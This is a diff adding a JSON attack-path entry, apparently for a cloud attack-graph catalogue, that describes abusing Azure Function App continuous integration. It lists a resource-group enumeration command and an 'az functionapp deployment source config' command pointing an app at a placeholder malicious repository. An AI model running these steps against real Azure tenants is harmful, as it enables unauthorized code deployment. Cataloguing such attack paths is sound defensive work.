@@ -1,0 +1,36 @@
+{
+    "title": "Exploit Continuous Integration to Deploy Malicious Code",
+    "icon": "https://img.icons8.com/?size=100&id=Her2lTSVzfqP&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List Function Apps",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "az functionapp list --resource-group <ResourceGroupName>",
+                "description": "Lists all function apps in the specified resource group.",
+                "services": ["FunctionApp"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest#az-functionapp-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Set Continuous Integration",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/integration.png",
+            "details": {
+                "command": "az functionapp deployment source config --name <AppName> --resource-group <ResourceGroupName> --repo-url <MaliciousRepoURL> --branch master --manual-integration",
+                "description": "Configures continuous integration to deploy malicious code from a repository.",
+                "services": ["FunctionApp"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/functionapp/deployment/source?view=azure-cli-latest#az-functionapp-deployment-source-config"
+            }
+        }
+    ]
+}
